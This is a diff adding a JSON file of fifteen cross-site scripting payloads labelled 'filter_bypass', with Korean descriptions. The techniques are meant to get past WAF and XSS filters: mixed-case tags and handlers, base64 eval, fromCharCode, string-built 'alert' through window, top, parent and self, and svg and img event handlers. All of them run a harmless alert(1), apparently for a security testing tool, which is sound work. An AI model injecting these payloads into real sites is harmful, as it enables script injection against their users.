@@ -1,0 +1,111 @@
+{
+  "category": "filter_bypass",
+  "description": "필터 우회 기법 - WAF 및 XSS 필터를 우회하기 위한 페이로드",
+  "payloads": [
+    {
+      "id": "bypass_001",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "description": "대소문자 혼합",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "bypass_002",
+      "payload": "<script>alert`1`</script>",
+      "description": "백틱 사용",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "bypass_003",
+      "payload": "<script>alert(/1/)</script>",
+      "description": "정규표현식 사용",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "bypass_004",
+      "payload": "<script>alert(String.fromCharCode(49))</script>",
+      "description": "String.fromCharCode 인코딩",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "bypass_005",
+      "payload": "<script>eval(atob('YWxlcnQoMSk='))</script>",
+      "description": "Base64 인코딩 (alert(1))",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "bypass_006",
+      "payload": "<svg><script>alert(1)</script></svg>",
+      "description": "SVG 내부 스크립트",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "bypass_007",
+      "payload": "<img src=x oNeRrOr=alert(1)>",
+      "description": "이벤트 핸들러 대소문자 혼합",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "bypass_008",
+      "payload": "<img src=x:alert(1) onerror=eval(src)>",
+      "description": "eval을 통한 간접 실행",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "bypass_009",
+      "payload": "<svg/onload=alert(1)>",
+      "description": "슬래시로 공백 대체",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "bypass_010",
+      "payload": "<script>window['al'+'ert'](1)</script>",
+      "description": "문자열 연결로 함수명 생성",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "bypass_011",
+      "payload": "<script>top['al'+'ert'](1)</script>",
+      "description": "top 객체를 통한 접근",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "bypass_012",
+      "payload": "<script>parent['al'+'ert'](1)</script>",
+      "description": "parent 객체를 통한 접근",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "bypass_013",
+      "payload": "<script>self['al'+'ert'](1)</script>",
+      "description": "self 객체를 통한 접근",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "bypass_014",
+      "payload": "<img src onerror=alert(1)>",
+      "description": "src 속성값 생략",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "bypass_015",
+      "payload": "<img/src/onerror=alert(1)>",
+      "description": "공백 대신 슬래시 사용",
+      "context": ["html"],
+      "severity": "high"
+    }
+  ]
+}
